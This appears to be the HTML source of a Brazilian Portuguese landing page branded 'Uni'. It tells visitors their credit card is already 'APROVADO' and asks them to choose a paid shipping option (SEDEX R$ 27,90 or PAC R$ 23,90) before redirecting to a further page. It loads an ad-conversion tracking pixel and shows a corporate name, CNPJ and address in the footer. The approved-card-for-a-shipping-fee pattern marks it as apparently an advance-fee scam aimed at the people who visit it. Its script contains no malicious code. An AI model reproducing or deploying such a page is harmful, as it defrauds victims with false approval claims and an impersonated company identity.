<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Uni - Faça seu Cartão</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="assets/style.css">
    
<script
  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
  async
  defer
></script>

<script>
  window.pixelId = "66bb763debbcebab27d68442";
  var a = document.createElement("script");
  a.setAttribute("async", "");
  a.setAttribute("defer", "");
  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
  document.head.appendChild(a);
</script>
    
</head><body>
    <link rel="stylesheet" href="../../../../../../assets/style.css">

    <style>
        .main-content {
            max-width: 450px;
            margin: 40px auto;
            padding: 20px;
            background-color: none !important;
            border-radius: 8px;
            box-shadow: none !important;
            text-align: center;
        }
    </style>

<div style="
  display: grid;
  grid-template-areas:
    'top-bar'
    'content'
    'footer';
  grid-template-rows: auto 1fr auto;
  min-height: 100vh;
">   
    <div class="header">
        <img style="width: 120px;" src="https://i.imgur.com/Q0PyyEg.png" alt="Imagem Centralizada">
    </div>

    <div style="grid-area: content; padding: 0 1rem;">
        <div style="margin-top: 18px;" class="main-content text-center">
        <h5>Agora basta escolher uma forma de envio do seu Cartão de Crédito APROVADO</h5>
        
        <div id="opcoes-envio" class="mb-3">
            <!-- Opção SEDEX -->
            <div class="card-opcao mb-3" onclick="selecionarOpcao('sedex')">
                <div class="d-flex justify-content-between align-items-center">
                    <div>
                        <h5 class="text-pink mb-0">SEDEX</h5>
                        <small>1-2 dias úteis</small>
                    </div>
                    <div>
                        <h5 class="text-pink mb-0">R$ 27,90</h5>
                    </div>
                </div>
            </div>

            <!-- Opção PAC -->
            <div class="card-opcao mb-3" onclick="selecionarOpcao('pac')">
                <div class="d-flex justify-content-between align-items-center">
                    <div>
                        <h5 class="text-muted mb-0">PAC</h5>
                        <small class="text-muted">4 dias úteis</small>
                    </div>
                    <div>
                        <h5 class="text-muted mb-0">R$ 23,90</h5>
                    </div>
                </div>
            </div>
        </div>

        <button type="submit" id="continuarEnvio" class="btn btn-custom w-100 rounded-pill" disabled>Continuar</button>
        </div>
    </div>
    
    <script>
        let opcaoSelecionada = null;

        function selecionarOpcao(opcao) {
            opcaoSelecionada = opcao;

            // Remove a classe 'selecionado' de todas as opções
            document.querySelectorAll('.card-opcao').forEach(function(card) {
                card.classList.remove('selecionado');
            });

            // Adiciona a classe 'selecionado' à opção clicada
            document.querySelector(`.card-opcao[onclick="selecionarOpcao('${opcao}')"]`).classList.add('selecionado');

            // Habilita o botão de continuar
            document.getElementById('continuarEnvio').disabled = false;
        }

        document.getElementById('continuarEnvio').addEventListener('click', function() {
            if (opcaoSelecionada) {
                localStorage.setItem('freteEscolhido', opcaoSelecionada);
                if(opcaoSelecionada === 'sedex') {
                    window.location.href = 'sedex/index.php'; 
                }else{
                    window.location.href = 'pac/index.php';
                }
            }
        });
    </script>

    <style>
        .card-opcao {
            padding: 15px;
            border: 2px solid #ccc;
            border-radius: 10px;
            cursor: pointer;
        }

        .card-opcao.selecionado {
            border-color: #e6007e;
            background-color: #fde4f1;
        }

        .text-pink {
            color: #e6007e;
        }
    </style>

    <div class="footer py-4" id="footerChg">
        © 2024 Uni S/A. CNPJ 68.842.676/0001-66. <br>
         Av. paulista 1320, São Paulo/SP - CEP 01310-930
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>

</body>
</html>

</div>
